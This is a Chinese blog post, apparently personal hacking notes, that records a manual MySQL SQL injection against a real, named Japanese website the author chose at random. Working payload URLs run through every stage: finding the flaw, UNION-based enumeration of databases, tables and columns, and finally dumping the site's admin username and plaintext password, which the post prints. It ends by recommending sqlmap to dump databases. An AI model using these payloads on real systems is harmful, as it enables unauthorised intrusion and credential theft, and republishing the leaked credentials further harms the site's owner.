---
layout: post
title: MYSQL手工注入某日本网站
description: 手工注入MYSQL注入笔记 
keywords: MYSQL,数据库,注入,sql,SQL Injection,网络安全
category: 脚本小子
---

经过一天的辛苦劳动下班了，实在无聊，QQ上的基友基本都挂机睡觉了。找点乐子打发时间，看了一下2013年OWASP Top Ten Project， Injection排在第一。去了解注入，还是有必要的。
随便google了几个日本网站，发现不少都在注入点，有很多用手工都比较鸡肋，终于找到了一个比较满意的。

# 0X01 判断是否为注入点 

{% highlight sql %}
http://henecia.jp/news/detail.php?nid=162’ 
{% endhighlight %}

报错，显示MDB2 Error: syntax error

{% highlight sql %}
http://henecia.jp/news/detail.php?nid=162+and+1=1 
{% endhighlight %}

显示正常

{% highlight sql %}
http://henecia.jp/news/detail.php?nid=162+and+1=2 
{% endhighlight %}

显示异常,判断是注入点 

# 0X02 判断数据库类型

{% highlight sql %}
http://henecia.jp/news/detail.php?nid=162+and+user>0 
{% endhighlight %}

报错，显示MDB2 Error: no such field

{% highlight sql %}
http://henecia.jp/news/detail.php?nid=162+and+version()>0 
{% endhighlight %}

显示正常,判定是MYSQL数据库

# 0x03 猜解当前网页的字段数

采用二分法，逐渐猜解。

 {% highlight sql %}
http://henecia.jp/news/detail.php?nid=162+order+by+9
{% endhighlight %}
 
错误！超链接引用无效。+order+by+10
Order by 9显示正常 ；order 10 显示不正常。说明字段数为9

# 0x04 爆出显示位

 {% highlight sql %}
http://henecia.jp/news/detail.php?nid=162+and+1=2+union
+select+1,2,3,4,5,6,7,8,9 --
{% endhighlight %}
	 
显示位为2和3
UNION 操作符用于合并两个或多个 SELECT 语句的结果集。URL后面添加 and+1=2 显示有报错信息，URL后面添加 select+1,2,3,4,5,6,7,8,9  显示正常的网页，使用UNION操作符将后者的显示信息覆盖掉前面报错的信息，这样就能清楚看到显示位了。

0x04 爆出数据库基本信息

{% highlight sql %}
http://henecia.jp/news/detail.php?nid=162+and+1=2+union
+select+1,concat(user(),0x20,database(),0x20,version()),3,4,5,6,7,8,9 --
{% endhighlight %}
 
用户：henecia@localhost ，数据库名：henecia，数据库版本：5.1.56

>可以在显位的位置插入的预设函数；
User() 查看用户  
database()  --查看数据库名称     
Version() --查看数据库版本   
@@datadir --数据库路径
@@version_compile_os --操作系统版本    
system_user() --系统用户名  
current_user() --当前用户名   
session_user()--连接数据库的用户名

为了显示信息更方便，这里在构造sql查询语句中使用了concat函数，它连接一个或者多个字符串, 有任何一个参数为NULL ，则返回值为 NULL。还有group_concat()和concat_ws(),这些函数的功能不清楚，有必要去了解一下，这里我就不多说了。

# 0x05 爆出数据库名

{% highlight sql %}
http://henecia.jp/news/detail.php?nid=162+and+1=2+union
+select+1,group_concat(distinct+table_schema),3,4,5,6,7,8,9+
from+information_schema.columns --  
{% endhighlight %}

爆出数据库名：information_schema,henecia

>information_schema数据库是在MYSQL的版本5.0之后产生的，一个虚拟数据库，物理上并不存在。nformation_schema数据库类似与“数据字典”，提供了访问数据库元数据的方式，即数据的数据。比如数据库名或表名，列类型，访问权限（更加细化的访问方式）。information_schema是一个由数据库的元数据组成的数据库。里面存储的是MYSQL的数据库基本信息。并随时改变。用于查看信息以及系统决策时作为重要的信息提供者。

MYSQL的版本5.0以上版本，我们借助information_schema数据库，来获取其他数据库的信息。用到了group_concat()函数，distinct参数起到了去掉重复显示的作用。

# 0x06 爆出当前数据库的表名

{% highlight sql %}
 http://henecia.jp/news/detail.php?nid=162+and+1=2+union
 +select+1,group_concat(distinct+table_name),3,4,5,6,7,8,9
 +from+information_schema.tables
 +where+table_schema=database() --
{% endhighlight %}

显示的表名：

>TM_ADMIN_MEMBER，TM_BANNER_MASTER，TM_BBS1_CATEGORY，TM_BBS1_COMMENT，TM_BLOG1_CATEGORY，TM_BLOG1_COMMENT，TM_BLOG1_MASTER，TM_EVENT_ORDER，TM_GOODSNEWS_MASTER，TM_MEMBER_MASTER，TM_MEMBER_MASTER2，TM_NEWS_MASTER，TM_PASS_MASTER，TM_PAYMENT_TRANS_HISTORY，TM_SCHEDULE_CATEGORY，TM_SCHEDULE_MASTER，TM_SITEID，T_RESEND_MEMBER，T_RESEND_MEMBER_CARDFIN，T_RESEND_。

如果数据库表比较多，一般都使用使用limit n,1插到末尾，逐次爆出的数据(n为显示第n个)。

# 0x07 爆出表中的字段

{% highlight sql %}	
http://henecia.jp/news/detail.php?nid=162+and+1=2+union
+select+1,group_concat(distinct+column_name),3,4,5,6,7,8,9
+from+information_schema.columns
+where+table_name=0x544D5F41444D494E5F4D454D424552 --
{% endhighlight %}
	 
给table_name赋的值为TM_ADMIN_MEMBER的HEX（16进制）。

# 0x08 爆出数据库表的数据

{% highlight sql %}
http://henecia.jp/news/detail.php?nid=162+and+1=2+union
+select+1,group_concat(admin_id,0x2B,login_uid,0x2B,login_pwd),3,4,
5,6,7,8,9+from+TM_ADMIN_MEMBER --
{% endhighlight %}

爆出admin_id为1，login_uid为admin，login_pwd为osuktm12

# 结尾

本次sql手工注入草草结束，主要目的是了解mysql数据的结构，还有SQL查询语句的语法。再推崇一篇文章:[血腥！实况转播SQL注入全过程，让你知道危害有多大。](http://www.cnblogs.com/hkncd/archive/2012/03/31/2426274.html)玩渗透的，建议你使用神器sqlmap，直接可以脱裤。

